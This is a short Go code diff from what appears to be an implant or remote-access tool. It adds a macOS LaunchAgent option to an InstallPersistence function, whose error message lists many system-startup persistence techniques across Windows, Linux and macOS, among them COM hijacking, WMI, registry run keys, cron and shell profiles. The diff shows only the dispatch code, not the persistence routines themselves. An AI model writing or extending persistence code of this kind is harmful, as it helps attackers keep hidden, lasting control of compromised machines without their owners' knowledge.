@@ -66,6 +66,11 @@ func InstallPersistence(method string) ([]byte, error) {
 			return nil, fmt.Errorf("COM hijack persistence is Windows-only")
 		}
 		return persistCOMHijack(exe)
+	case "launchagent":
+		if runtime.GOOS != "darwin" {
+			return nil, fmt.Errorf("launchagent persistence is macOS-only")
+		}
+		return InstallPersistenceDarwin("launchagent", exe)
 	case "profile":
 		if runtime.GOOS == "windows" {
 			return nil, fmt.Errorf("profile persistence is Linux/macOS-only")
@@ -81,7 +86,7 @@ func InstallPersistence(method string) ([]byte, error) {
 	case "remove":
 		return removePersistence()
 	default:
-		return nil, fmt.Errorf("unknown method: %s\n\nWindows: registry, schtask, startup, wmi, winservice, logonscript, comhijack\nLinux:   cron, service, bashrc, profile, rc.local\nOther:   list, remove", method)
+		return nil, fmt.Errorf("unknown method: %s\n\nWindows: registry, schtask, startup, wmi, winservice, logonscript, comhijack\nLinux:   cron, service, bashrc, profile, rc.local\nmacOS:   launchagent, cron\nOther:   list, remove", method)
 	}
 }
 
